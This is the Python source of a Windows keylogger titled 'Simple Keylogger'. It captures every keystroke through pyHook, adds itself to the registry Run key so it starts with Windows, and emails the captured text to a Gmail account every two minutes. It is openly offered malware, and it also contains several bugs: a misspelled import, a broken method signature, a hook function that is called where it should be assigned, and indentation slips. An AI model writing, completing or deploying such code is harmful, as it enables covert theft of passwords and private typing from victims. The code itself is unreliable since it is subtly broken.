#!/usr/bin/python

"""
Title: Simple Keylogger
Version: 1.0
Release Date: 10-24-15
Author: Father <father@0nl1ne.at>
"""

import os
import sys
import smtplib
import threading
import datetime,time
import pythoncom, pyHook
import win23event, win32api, winerror
from _winreg import *

#Dis-Allow Multiple Instances
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
	mutex = None
	exit(0)
x = ''
data = ''
count = 0

#Add to Start-Up
def addStartUp():
	if getattr(sys, 'frozen', False):
		filePath = os.path.dirname(os.path.realpath(sys.executable))
	elif __file__:
		filePath = os.path.dirname(os.path.realpath(__file__))
	file_name=sys.argv[0].split("\\")[-1]
	new_file_path=filePath+"\\"+file_name
	keyValue= r'Software\Microsoft\Windows\CurrentVersion\Run'

	key2change = OpenKey(HKEY_CURRENT_USER, keyValue,0,KEY_ALL_ACCESS)

	setValueEx(key2change, "logger",0,REG_SZ, new_file_path)

#E-Mail Log
class Timer(threading.Thread):
	def __init__(slef)
		threading.Thread.__init__(self)
		self.event = threading.Event()
	def run(self):
		while not self.event.is_set():
			global data
			if len(data)>100:
				timeStamp = datetime.datetime.now()
				SERVER = "smtp.gmail.com"		#Specify Server
				PORT = 587				#Specify Port
				USER = "email@gmail.com"		#Specify Username
				PASS = "password"			#Specify Password
				FROM = USER
				TO = ["email@gmail.com"]		#Use coma for multiple E-Mails
				SUBJECT = "keypress.py data: "+str(timeStamp)
				MESSAGE = data
				message = """\ From: %s To: %s Subject: %s %s """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
				try:
					server = smtplib.SMTP()
					server.connect(SERVER,PORT)
					server.starttls()
					server.login(USER,PASS)
					server.sendmail(FROM, TO, message)
					data=''
					server.quit()
				except Exception as e:
					pass
				
				self.event.wait(120)

def main():
	addStartUp()
	email=Timer()
	email.start()

if __name__ == '__main__':
	main()

def keypressed(event):
	global x,data
	if event.Ascii==13:
		keys='<ENTER>'
	elif event.Ascii==8:
		keys='<BACK SPACE>'
	elif event.Ascii==9:
		keys='<TAB>'
	else:
		keys=chr(event.Ascii)

		data=data+keys

obj = pyHook.HookManager()
obj.KeyDown = keypressed()
obj.HookKeyboard()
pythoncom.PumpMessages()
